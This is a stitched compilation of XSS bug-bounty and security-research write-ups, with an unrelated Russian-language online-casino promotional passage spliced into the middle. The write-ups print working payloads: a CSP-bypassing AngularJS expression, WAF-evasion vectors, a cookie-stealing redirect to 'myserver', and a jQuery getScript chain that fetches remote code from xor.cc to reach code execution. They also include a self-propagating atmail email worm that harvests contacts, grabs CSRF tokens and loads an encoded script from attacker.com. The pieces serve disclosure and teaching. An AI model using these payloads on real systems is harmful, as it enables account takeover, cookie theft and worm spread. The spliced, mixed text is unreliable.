of the documentation : When script or style data is the content of an element ( SCRIPT and STYLE ), the data begins immediately after the element start tag and ends at the first ETAGO (“</”) delimiter followed by a name start character ([a-zA-Z]); note that this may not be the element’s end tag. Authors should therefore escape “</” within the content. How to prevent this from happening, from the chapter Restrictions for contents of script elements : The easiest and safest way to avoid the rather strange restrictions described in this section is to always escape “ <!-- ” as “ <\\!-- “, “ <script ” as “ <\\script “, and “ </script ” as “ <\\/script ” when these sequences appear in literals in scripts (e.g. in strings, regular expressions, or comments), and to avoid writing code that uses such constructs in expressions. Doing so avoids the pitfalls that the restrictions in this section are prone to triggering: namely, that, for historical reasons, parsing of script blocks in HTML is a strange and exotic practice that acts unintuitively in the face of these sequences. This still wouldn’t be enough to get a working XSS on the page ( in modern browsers ) since they have a Content Security Policy set up. I wrote about bypassing CSP in a separate article . In a nutshell, CSP allows you to whitelist allowed sources of scripts, styles, and other resources to mitigate XSS attacks. This means a <script> element just like that wouldn’t be able to get through CSP and therefore wouldn’t be executed. Fortunately, Google Code-in uses AngularJS on its frontend. This means CSP can be easily bypassed. Expressions such as {{1-1}} get easily evaluated (see Angular XSS on McDonalds.com ). Since AngularJS 1.6, Google removed the expression sandbox completely, which means we can access the document with no problem just like this: {{constructor.constructor('alert(\"xss\")')()}} Now we have a working payload that gets executed every time someone (in this case mentors or site admins) opens the comments page.

Well…The story begins just like every bug hunter’s daily routine.. Just a normal day in search for any bug that i could get my hands on. But no luck..Now they usual thought came in “ Time to jump to the next program ” and i jumped and landed straight on a program called ZENDESK .. Now i had to find what does this website do🤔🤔…It took me about 20 minutes to understand that it was actually a Support desk providing site for other websites.. Ok Now to Initialise the hunt.. Tempmail..Account Create..Bla Bla, And Logged on to my account. Hmmm….What next!! Of course time to test for xss Basically all i did was just inserting payloads on all the input fields i could get my hands on. This is when i came across a rich text editor but it did not have any much function just like normal text editors. In it i found a URL input field and what’s funny about this field is that it does not actually detect if the given input is a URL. So i put my favorite XSS payload “ Love Img XSS Payload ” in the url input field and click ok. But Nothing…. But…Apart from the url input field there was a ALTERNATIVE TEXT for the url. So i tested my luck on that…gave a random url and dropped the XSS payload on the ALTERNATIVE TEXT and clicked on ok. I Click on the Link and BOOM!! Got XSSed….

Just another XSS POC writeup ..!!! Rohan Chavan 6 min read · Feb 3, 2019 -- 2 Listen Share TLDR: This is an writeup of a recent bug which I found in smartsheet .It was an stored xss , but the way it was getting triggered was really great from the perspective for hackers, js was getting executed when any user clicks on the malicious notification , this could let any user takeover any account (with vertical and horizontal privileges ) which increased the severity of the Bug.The security team of the program was very professional and understood the scenario very well. Before we move forward, I’d really like to thank the smartsheet security team for this coordinated disclosure. Hello guyzz .!!! Thanks for your support and blessings.I hope you all are doing fine and are excited to read about this writeup because of the click-bait Title. So without wasting any time further, lets get straight into it. Its only been 2–3 months since I started bug-bounty.Before that I used to spend most of my time on hackthebox.eu and play CTFs ,back then I had tried bugbounty but I wasnt getting anything , after getting a -ve signal on my H1 profile because of NA’s , I got frustrated/depressed and left that track. (One of the Biggest mistake I ever did) From the last two month I decided to give 3 hours a day to bugbounty because I wanted to give oscp and didn’t wanted to put that burden on my parents back (P.S I am a student and not yet working).So the only option I was seeing to earn that money for my OSCP fees was BugBounty. And it worked out ..!!! I started with Points only programs in bugcrowd (Yeah I love bugcrowd, already had a bad experience with h1) because professional hunters don’t hunt for points.I was also testing wordpress plugins, most of them are Damn Buggy. Last month I reported around 5 bugs but this was the scenario. report’s stats But then I got my first bounty from ZOHO, ( I have provided a link to it at the end of this writeup ) .Then I saw smartsheet in the bugcrowd programs directory, Press enter or click to view image in full size It has a very catchy tagline which intimate any hacker/researcher to test their skills on the program. I was like ..!! Challenge Accepted ..!! I then read the program rules and scope, I saw a lot of researchers in recently joined (more than 500) as it was an old program, which makes it even tough. But I wanted to test myself. It was around 5pm when I started basic recon, started a nmap full port scan (this is the habit of all the HTB dudes, everything starts with NMAP …hahaha). Since it was going to take a while, i decided to signup and see what it actually is, because till that moment I had never came across that platform. I signed up and started wandering here and there, trying what all privilages do a normal user have. In that program a user is able to make a sheet somewhat similiar to Ms. Excel ( Go signup and check them out ..!!! ). we could give access of that sheet to various users of that program to manage the sheet, suppose I am tester , and I could give access to other person suppose victim1 , It is a cool feature isnt it ? but wait ..!!! whenever tester makes any change in the document, victim1 could be notified about it. (This is the main attack scenario, have written in brief about it further.) So I spent next few hours trying a lot of things like IDOR, sqli, also xss’s but since it was an old program mostly all the user inputs were properly sanitized and handled. It was really testing me. I started at 5pm and it was 9 pm now, I had dinner and started again at 9:30. But I had decided to not give up easily on it, like i used to do earlier.I motivated myself and got mentally prepared to spend next 2–3 days on it.Now I started fuzzing their api, and left it to run and got back to the main webapp. I was manually going through each and every request and response had lots of repeater tabs open , things started getting messy. It was now 11 pm, I plugged in my earphones psy-trance was playing and I was in the Trip of hacking. It popped my mind that I haven’t tried SSRF yet, and saw that I can attach link through attachment’s. I linked scanme.nmap.org:22 and in the link name parameter I entered the payload “><img src=x onerror=”alert(1)”> .But this time I enabled the notifications, and attached the link to the document.After a minute I saw the notification appeared. I clicked on the notification and saw that the html content after clicking on notification got a bit misplaced because of the above payload. Then I saw the markup near the link name parameter. and modified the payload as “>”><img src=x onerror=”alert(1)”> and attached the link. XSS payload Attached the link , nothing happened on the sheet. I continued to look for other things, After a few minutes I got the notification that attachment has been added to the document. Notification When I clicked on that notification XSS got executed ..!!! Press enter or click to view image in full size XSS triggered ..!!! So we now have an XSS, but how can I increase the impact !!! If you have read above , there is a feature in smartsheet which would allow you to notify/alert other users, what if another user suppose victim ,gets the malicious notification and he clicks on it ?? Yes then he will be truly a victim of the attack.It could be an account takeover. If attacker attaches an malicious attachment, and the true owner of that page clicks on the notification, his account would be compromised. We have an Account Takeover ..!!! Until this It was around 12.30 pm. I wrote a nice report and made a video POC and submitted the report on bugcrowd. I did it ..!!!

Heyy Everyonee, | by Sudhanshu Rajbhar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS in Zomato Sudhanshu Rajbhar 4 min read · Jan 21, 2019 -- 6 Listen Share Heyy Everyonee, In this writeup I am going to tell you how I was able to get xss in Zomato. I will tell the whole story how I found the vulnerable parameter. Actually at that time I was reading a book “Mastering Modern Web Penetration Testing” (You can get it on Amazon) and from there I got know about a website named wolframalpha which we can use for subdomain enumeration. I just thought of giving it a try , so I enetered zomato.com in the search bar and it gave me around 10 subdomains.It also shows “daily visitors” of a particular subdomain, thats a great options if you are looking for a less visited areas.So the last domain from the list caught my attention as the visitors were very less compared to others. Source: https://www.wolframalpha.com/input/?i=zomato.com I opened secretx.zomato.com, and all I can see is a button -“sign in with Zomato”.I checked the source code , nothing ineteresting. I clicked on the button, it redirected me to zomato.com and a box was there saying “SecretX Client wants to access you Zomato Account. Accept or Recject” . So I again went back to the website.From the source code I took out this url https://auth2.zomato.com/oauth2/auth?response_type=code&client_id=80b39918-90be-49d2-ac52-4a8b1a25bcf1&redirect_uri=https%3A%2F%2Fsecretx.zomato.com%2Fuser%2Foauth2%2Fredirect_uri&state=2BHoBnVFFKP29L6SerHgEb7OCnBDPO which was getting load when the button was clicked. Here I added some junk values to the parameters to check for any oauth misconfiguration.And it gave me some error. Press enter or click to view image in full size The parameter value was getting refleted in the source code, So i checked whether <,> are getting filtered or not.The result was, Naaah. Press enter or click to view image in full size I tried for xss but I couldn’t get it ,as there was waf.I spent some time on it but no progress, I started looking for XSS reports,waf bypass blogs then I tried with xss payload list. Boom yeah with the help of it I got the xss popup.The payload which worked for me was <marquee loop=1 width=0 onfinish=alert`1`>XSS</marquee> But I couldn’t access the DOM because alert(),confirm(),prompt() were getting blocked by the waf. Somehow I wanted to make it work, I tried url encoding the payload and other things but nothing worked.It was aound 3 : 40 am so I needed to go to bed coz don’t want to get late for school. After coming back I started looking for more articles,blogs.Then I got to remember about the xss cheatsheet which was by Somdev , here is the link https://github.com/s0md3v/AwesomeXSS co\\u006efirm() By encoding the character in unicode I was able to access the DOM. Press enter or click to view image in full size I submitted this report to Zomato,and the report was triaged and after that I went to sleep the next day when I woke up I checked the notification and I saw the mail “Zomato has rewarded you 250$”. In the report Prateek Tiwari mentioned that the problem was with Hydra which is an OAuth 2.0 and OpenID Connect Provider which Zomato are using for authentication on their services. For showing their gratitude,Hydra mentioned my name in their newsletter which was really great for me.

I visited Indeed.com bug bounty page and was happy to see that *.indeed.com was in scope. So I visited indeed.com and searched for manager in what field and google.com and searched. I tried various text and various characters to try and receive some error. After some minutes of typing various text, I saw an option to set an alert for a job.When I clicked the link I was redirected to Create job alerts! | Indeed.com Edit description subscriptions.indeed.com and immediately I tried <a href=https://www.google.com>Google</a> and input an email address and clicked Create job. I saw Click Here so I was really happy and when clicked redirected me to Google.com.Then I tried to inject <script>alert(1)</script> and it didn’t work. But when I tried <img src=x onerror=javascript:alert(document.domain);> I received alert and I was also able to steal cookies. I am writing this because it took me more than 2 months for me to properly explain and get it fixed because of the various mistakes I made along the way and want to help people not fall in the same trap. The first mistake I made was that reported it as self html injection because I didn’t try to test to receive an alert because I was just too happy that I actually found a bug. So my report was closed as N/A because it was just a simple html injection . So, I learned that even if you have found a bug try and stay calm and try to increase it’s threat. I made the report again but I was immediately denied as my first report was closed so it wasn’t even checked properly. So, understand that you have to properly explain with proper techniques and don’t expect that they will understand what you wanted. I respectfully wrote a detailed explanation that it wasn’t a simple html injection and javascript can be executed. They were happy that I decided to write the report again and asked to do so in the future if I think they didn’t understand it properly. If you think you report was not properly understood then respectfully explain it properly because they want to fix and work with you but you must be patient and clear. I had received a message that they acknowledged my report and submitted the report to developer team and I would be informed about the fix. But after 18 days I didn’t receive a message so I respectfully messaged them and I received a message that they are working on it and was fixed after some days of the message. So I just want to say that understand that it might take more than you think it might but don’t think they don’t want to fix it or get discouraged Before I found this vulnerability I had reported two vulnerability which had closed and I actually lost 2 points meaning I had -2 points. So when I submitted this report I got 5 points so my point became 3. I just wrote this because even though I had minus points and I worked hard and learned more and actually found a bug. If I can do it ofcourse anyone can do it. So never feel discouraged and always check robots.txt file. I also wanted to ask a question if anyone can help me how can I receive reward in Nepal since paypal is not allowed in Nepal so I haven’t been able to receive my reward.

It is used by companies, hosting providers, and ISPs including DreamHost, LegalShield (US), m:tel (Bosnia), iiNet, and Optus (Australia). Being an atmail user on DreamHost, and having seen several impressive email-based cross-site scripting (XSS) attacks during my work with bug bounty programs, I attempted to find a vulnerability in their webmail front-end. I had a working payload a few hours later, but wanted to take it a step further by building an old-school XSS worm . The most well-known example of an XSS worm affected MySpace in 2005 , with a more recent variation targeting TweetDeck in 2014 . In this post, I’ll demonstrate building an XSS payload that propagates itself through a victim’s contacts. The Testing Environment Before starting, I prepared a simple testing environment. Emails were sent using a command like the following, piping the XSS test payloads within content into mail: cat content | mail -a \"Content-type: text/html\" -s \"test\" [email protected] I then used the Firefox Developer Tools to view how the XSS payload was rendered in the DOM of the webmail client. Building the XSS Payload The first step was to build an XSS payload that would survive atmail’s content filtering intact. I started by sending an email containing every valid HTML tag to see which ones would remain after it was delivered, although I eventually decided to use the <img> tag. While <img> lends itself well to building XSS payloads, its disadvantage is that the victim must decide to “Display Images” within atmail before the XSS will trigger. It is likely a better payload could be developed using a tag which renders without further user interaction. Next, I began taking notes on how atmail sanitized my payloads. I needed to observe how atmail manipulated the characters and HTML attributes in the <img> tag in order to evade the filter and render a syntactically-correct tag in the victim’s browser. By sending an <img> tag containing every valid attribute(1), I noticed that only the src, alt, longdesc, style, height, and width attributes were permitted. Additionally, I noticed several modifications to my payload, such as converting single quotes to double quotes, removing the onerror event, and removing any <img> tag without a src attribute. Although the onerror event was removed, I suspected the conversion of single to double quotes might help evade the whitelist if both were used in the <img> tag. In the end, this suspicion proved correct, although I had to use the set of double quotes across two <img> tags. The below is the working XSS payload: <img longdesc=\"src='x'onerror=alert(document.domain);//><img \" src='showme'> This was rendered as the following in the webmail client: <img longdesc=\"src=\" images=\"\" stop.png\"=\"\" onerror=\"alert(document.domain);//\"\" src=\"x\" alt=\"showme\"> Without viewing the application source code, it is impossible to know exactly what changes are being made to my payload before it is delivered. However, it appears that atmail interprets the single and double quotes in such a way that the two <img> tags are combined into one. Including the onerror event in the longdesc attribute has allowed it through the content filter and rendered the XSS correctly after processing. Building the Worm After finding a working XSS vector, the next step was to create a payload to spread my email worm. I wrote some JavaScript that executes in three steps: Extract a victim’s contacts list Grab a valid CSRF token from atmail Send an email to each of the victim’s contacts This code resembled the following, with the XSS payload included in the block of URL-encoded text: //HTTP request to grab victim's contacts xmlHttp=new XMLHttpRequest(); xmlHttp.open('GET','/index.php/mail/contacts/viewcontacts/GroupID/0',false); xmlHttp.send(null); response=xmlHttp.responseText; //Extract email addresses and filter duplicates var extractedemails = response.match(/[A-Z0-9._%+-]+@[A-Z0-9.-]+.[A-Z]{2,4}/igm); var uniqueemails = []; for(var i = 0; i < extractedemails.length; i++){if (uniqueemails.indexOf(extractedemails[i]) == -1) uniqueemails.push(extractedemails[i]);} //HTTP request to get CSRF token xmlHttp.open('GET','/index.php/mail/contacts',false); xmlHttp.send(null); response2=xmlHttp.responseText; var csrftoken = response2.match(/name=\\\"atmailCSRF\" value=\\\"(.+?)\\\"/im); //Loop through contacts and send email for (var i = 0; i < uniqueemails.length; i++) { xmlHttp.open('POST','/index.php/mail/composemessage/send',false); var params = 'atmailCSRF=' + csrftoken[1] + '&emailTo=' + unique[i] + '&emailSubject=open%20me&emailBodyHtml=%3c%68%33%3e%61%74%6d%61%69%6c%20%65%6d%61%69%6c%20%58%53%53%20%77%6f%72%6d%3c%2f%68%33%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0a%3c%69%6d%67%20%6c%6f%6e%67%64%65%73%63%3d%22%73%72%63%3d%27%78%27%6f%6e%65%72%72%6f%72%3d%65%76%61%6c%28%77%69%6e%64%6f%77%2e%61%74%6f%62%28%27%61%57%35%6a%62%48%56%6b%5a%54%31%6b%62%32%4e%31%62%57%56%75%64%43%35%6a%63%6d%56%68%64%47%56%46%62%47%56%74%5a%57%35%30%4b%43%64%7a%59%33%4a%70%63%48%51%6e%4b%54%74%70%62%6d%4e%73%64%57%52%6c%4c%6e%4e%79%59%7a%30%6e%61%48%52%30%63%48%4d%36%4c%79%39%68%64%48%52%68%59%32%74%6c%63%69%35%6a%62%32%30%76%59%58%52%74%59%57%6c%73%4c%6d%70%7a%4a%7a%74%6b%62%32%4e%31%62%57%56%75%64%43%35%6f%5a%57%46%6b%4c%6d%46%77%63%47%56%75%5a%45%4e%6f%61%57%78%6b%4b%47%6c%75%59%32%78%31%5a%47%55%70%4f%77%3d%3d%27%29%29%3b%2f%2f%3e%3c%69%6d%67%20%22%20%73%72%63%3d%27%73%68%6f%77%6d%65%27%3e'; xmlHttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); xmlHttp.send(params); At first, I attempted to Base64-encode a minified version of this JavaScript and include it within the onerror event of the XSS payload. It would then be decoded and executed using eval(atob()), as shown below: <img longdesc=\" xss/ src='x'onerror=eval(window.atob('eGg9bmV3IFhNTEh0dHBS…omitted for brevity…'));//><img \" src='showme'> However, I noticed that atmail limited my Base64 string to 945 characters, which was too short. Instead of including the entire script in the onerror event, I hosted it at an external location, then rewrote my XSS payload like the following: onerror=\"include=document.createElement('script');include.src='https://attacker.com/atmail.js';document.head.appendChild(include);\" The payload shown above creates a new <script> tag in the <head> element of the page, including my malicious externally-hosted JavaScript. This was also Base64-encoded, making the final payload as follows: <img longdesc=\"src='x'onerror=eval(window.atob('aW5jbHVkZT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtpbmNsdWRlLnNyYz0naHR0cHM6Ly9hdHRhY2tlci5jb20vYXRtYWlsLmpzJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGluY2x1ZGUpOw=='));//><img \" src='showme'> With everything in place, the worm was now functional. This video demonstrates it in action: An XSS worm on atmail would benefit spammers and other malicious actors who would benefit from manipulating victims into sending arbitrary messages to their contacts list. Because of its viral nature and the additional trust associated with email received from a known contact, this attack would be well-suited for spam, malware delivery, or phishing attacks. Disclosure Timeline: After discovering this vulnerability, I began the responsible disclosure process with atmail. As of May 25, 2017, they have remediated the issue, which can be patched by upgrading to atmail version 7.8.0.2 . 2017-02-24 – Vulnerability reported 2017-02-27 – Report acknowledged 2017-05-25 – Patch released References (1) <img src=\"x\" align=\"left\" alt=\"test\" border=\"1px\" crossorigin=\"anonymous\" height=\"100px\" hspace=\"100px\" ismap longdesc=\"test\" sizes=\"(min-width: 600px) 200px, 50vw\" srcset=\"test.png 2x\" usemap=\"#test\" vspace=\"100px\" width=\"100px\"> Supercomputer image by Dennis van Zuijlekom Subscribe to our blog and advisories Be first to learn about latest tools, advisories, and findings.

Sep 8, 2015 Note: this has been fixed . XSS to RCE “yeah right, RSnake” I accidentally triggered a cross-site scripting (XSS) vulnerability in <conf provider X> that worked when using the web application as well as the native OS X application (and possibly additional clients). Nowadays, XSS -> Remote Code Execution (RCE) is possible thanks to Node. For every person in any meeting that I join, I could execute code on their computer. Standup I entered a meeting with the classic first name of <img src=x onerror=alert()> (the bobby tables of XSS). A few minutes into the conversation, patrick noticed a broken image pop up. Uh oh. When I asked if he also saw an alert box, my colleague ben chimed in and said yes. So we have XSS. Sweet. In at least two clients. Hmmm, this could be bad. eval(prompt()) We noticed that there was some filtering going on (such as stripping quotes), so we’d have to use String.toCharCode to generate any string values. The web app enforced a value length but this is easily bypassed with a proxy and was not enforced in the desktop client. ben quickly came up with a good way to explore the impact of this xss with a simple debug console: <img src=x onerror=eval(prompt())> (35 chars) This lets us generate payloads without having to generate toCharCode code each time. Sure this isn’t difficult, but an executing prompt is so much easier to use. Exploring the native app greg took a look at the <conf provider X> native application and noticed it used Node. Perhaps process.open would work. It did. Putting it all together That’s when ben put everything together using a very short payload: <img src=x onerror=$.getScript(String.fromCharCode(47,47,120,111,114,46,99,99))> (80 chars) Now join any existing meeting and enter the above payload as your name. Everyone in the room see an alert box. Those using the native apps will also see their calculators open. How it works The use of String.fromCharCode is just a classic way to bypass filtering/escaping of quotes. String.fromCharCode(47,47,120,111,114,46,99,99) is //xor.cc . The payload can be simplified as: <img src=x onerror=$.getScript(\"//xor.cc\")> $.getScript tells jQuery to fetch and execute the javascript at xor.cc . The fetched javascript that opens the calculator is: process.open(\"/Applications/Calculator.app/Contents/MacOS/Calculator\"); (72 chars) Why it sort of matters XSS is XSS is XSS. But XSS in an app with an API to the filesystem is XSS is worse. <conf provider X> meetings typically are… unauthenticated. Everyone raise your hand. Now put down your hand if you have required password authentication for every meeting you have joined. Look to your left, look to your right, and notice everyone’s hand is still up. If you’ve used <conf provider X>, chance are you’ve used it in a manner that let’s this exploit work on any publicly known or guessable <conf provider X> meeting ID. I did not try to brute force the meeting space for open meetings. That would have been bad. Calculators You can’t have a good exploit unless calculators are involved. See PDF content-type sniffing for an even better use of calculators in an attack. Conclusion Big ups to the GitHub appsec team. Within one hour we went from XSS to RCE. And it played out like something in one of those movies or TV shows. “We popped a faux console using eval and prompt while ripping open the binary to leverage a libary with system access to perform remote code execution… to open a calculator.” Most of the credit has to go to ben and greg , I just found XSS and I wouldn’t have even known without patrick . Did I mention that we’re hiring an intern for the appsec team? Blawg Blawg neil.matatall@gmail.com oreoshake Just some ramblings. Probably about CSP."}

Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь.

Hi all, This is a short blog post about making exploitable Cookie based XSS. I was testing a site [redacted.com] can’t take name for Obvious reasons. I was testing it on the Repeater tab on the burp and testing a parameter which was reflecting back on the HTML page but encoded. URL:- http:// [redacted.com] /path/file.php?f=a*&location =12 * was the injection point I was trying. <script type=\"text/javascript\"> page.perform('a*', 12); </script> I was trying to bypass the filter by injecting different payload again and again (means sending requests again and again) and all of the sudden I got another parameter reflected on the page which was cookie parameter which was not reflected before. How? Frankly I don’t know ? <script type=\"text/javascript\"> page.perform('a*', 12, '&PHPSESSID=73uj42unj5vu6urg6v4aa8'); </script> I was literally surprised that How I got this new parameter reflected on the page and why not before. Okay go on, now I started to see if that cookie parameter can be injected or not and to my surprised it was inject-able. Now I got XSS injection point but the main thing is How Can I exploit it against users ? For making cookie based XSS injection exploitable you might need to exploit another vulnerability i.e. CRLF (because you can then try %0d%0aSet-Cookie). I tried to find out but didn’t get it. Next I got an idea what if I place that Cookie paramete r into the URL GET parameters like this:- http://[redacted.com]/path/file.php?f=a&location =12&PHPSESSID={payload} payload:- a’);document.location=” http://myserver/ \"%2bdocument.cookie;test('. and yeah it works the same. Wow! I got all the cookies on my server. I quickly reported it to the team. :) It was a good case for me. AND one thing I got to learn is that if you got cookie based injection then you should also check by replace the parameter from cookie header to URL parameter like when you do POST to GET to make easy exploitable.

So I tried to close string 'name' with adding single quote to parameter and inject own javascript code in page but at server side, single quotes are replaced with empty string. They think this work can stop XSS attack but there are alternative ways to closing the string. First way is add newline like this /?key=name%0a&value=value <html> <body> <script> if ('name ' != '') { if (window.location.indexOf('exmaple.com') != -1) { document.cookie = 'name ' + \"=\" + 'value' + \";domain=example.com\"; } else { document.cookie = 'name ' + \"=\" + 'value'; } } </script> </body> </html> Second way is escaping close single quote with backslash. /?key=name\\&value=value <html> <body> <script> if ('name\\' != '') { if (window.location.indexOf('exmaple.com') != -1) { document.cookie = 'name\\' + \"=\" + 'value' + \";domain=example.com\"; } else { document.cookie = 'name\\' + \"=\" + 'value'; } } </script> </body> </html> at line document.cookie = ' name\\' + \"=\" + 'value'; the string closed by starting single quote of second string. Now value of value parameter is parsed as code -not data. So I try to inject payload in value parameter like /?key=name\\&value=;alert(1);// <html> <body> <script> if ('name\\' != '') { if (window.location.indexOf('exmaple.com') != -1) { document.cookie = ' name\\' + \"=\" + ';alert(1);//' + \";domain=example.com\"; } else { document.cookie = ' name\\' + \"=\" + ';alert(1);//'; } } </script> </body> </html> There is still a problem. An error occur at if ('name\\' != '') { because of unclosed string and interpreter doesn’t execute alert(1) . So I try to use alternative way to pass error. The new payload use </script><script> and like this /?key=name%0a</script><script>alert(1);</script>&value=value but the request is blocked by WAF. Add newline is bypass WAF in a simple way. /?key=name%0a</script><script>alert(1);%0a</script>&value=value . Unfortunately, Google Chrome XSS Auditor detects and blocks last payload. Now the second parameter comes in. I split payload in two parameters and generate final payload that is working. /?key=name%0a</script></script>alert(&value=%2bdocument.cookie);%0a</script> Press enter or click to view image in full size alert(document.cookie) Note: you can find a simple server code that simulate this challenge here Note: I have seen Google Chrome XSS auditor bypass with two parameters many years ago that is used multiline comment /* */ and was patched but you can see it’s work with some changes (using <script> ) JavaScript Ctf Bug Bounty Xss Attack Hacking -- -- Written by Mahmood Shahabi 28 followers · 6 following Interseted in Cyber Security; Noob CTFer; Bug Hunter No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

This blog is a way for TSS staff to contribute back to the security industry XSS in Dynamics 365 Tim Kent 2 min read · Nov 6, 2018 -- Listen Share I recently tested an application hosted within Microsoft’s Dynamics 365 online services platform. During the test I discovered a Cross-Site Scripting (XSS) vulnerability . Dynamics 365 is typically extended with customer code which can be a source of trouble, however the vulnerability discovered was in the Dynamics 365 product itself. After obtaining permission from the client, I worked with the Microsoft Security Response Center to fix the issue. Now that it has been patched (as of the 18th October 2018) I can disclose the details of this vulnerability: Within Dynamics 365, the “Personal Document Template: Information” page reflects the user’s name without encoding it properly, so if the field is injected with a JavaScript payload, it will be run unchecked. Press enter or click to view image in full size In the Dynamics 365 tenant being tested, I was able to change the First Name and Last Name values for the “Application User” (this appears to be separate to the Azure AD User, which was locked down). I set the First Name field to contain a JavaScript payload. No special tricks needed; the payload was simply “</script><script>alert(‘xss’)</script>”. The First Name and Last Name fields are used throughout the application and are usually encoded safely. However the “Personal Document Template: Information” page reflects these fields without encoding and runs the payload. With this payload set, a malicious user can create or update any template they have access to, and direct a victim to the template information page. When the owner and last modified fields are loaded into the victim’s browser, the payload is fired. As you can see, this was not a complicated attack in hindsight but it has the potential to have a large impact. It is also a good example of how assumptions should not be made about the code base being tested. If I had assumed the product code had been extensively tested and was secure, then this simple XSS injection would have been overlooked. The takeaway is to try and remember to sanitise and encode all inputs/outputs, regardless of what they are used for, and not to make assumptions but rely on empirical evidence as a penetration tester! Thanks to Microsoft for acting as a responsible vendor in accepting and patching this vulnerability in such a short period of time.

Articles Overview Core Topics Black Hat XSS Request Smuggling Template Injection Top 10 Hacking Techniques Articles Meet the Researchers James Kettle Gareth Heyes Martin Doyhenard Zakhar Fedotkin Talks RSS XSS in hidden input fields Gareth Heyes Researcher @garethheyes Published: 16 November 2015 at 11:25 UTC Updated: 14 June 2019 at 12:03 UTC At PortSwigger, we regularly run pre-release builds of Burp Suite against an internal testbed of popular web applications to make sure it's behaving properly. Whilst doing this recently, Liam found a Cross-Site Scripting ( XSS ) vulnerability in [REDACTED], inside a hidden input element: <input type=\"hidden\" name=\"redacted\" value=\" default\" injection=\"xss\" /> XSS in hidden inputs is frequently very difficult to exploit because typical JavaScript events like onmouseover and onfocus can't be triggered due to the element being invisible. I decided to investigate further to see if it was possible to exploit this on a modern browser. I tried a bunch of stuff like autofocus, CSS tricks and other stuff. Eventually I thought about access keys and wondered if the onclick event would be called on the hidden input when it activated via an access key. It most certainly does on Firefox! This means we can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute. Here is the vector: <input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\"> This vector isn't ideal because it involves some user interaction, but it's vastly better than expression() which only works on IE<=9. Please note if your reflection is repeated then the key combination will fail. A workaround is to then inject another attribute that breaks the second reflection. e.g. \" accesskey=\"x\" onclick=\"alert(1)\" x=' Note: We've reported this vulnerability to the application's security team. However, they haven't responded in any way after 12 days and a couple of emails. We wanted to make people aware of this particular technique, but we won't be naming the vulnerable application concerned until a patch is available. This isn't the first time that Burp Scanner has unearthed a vulnerability in an 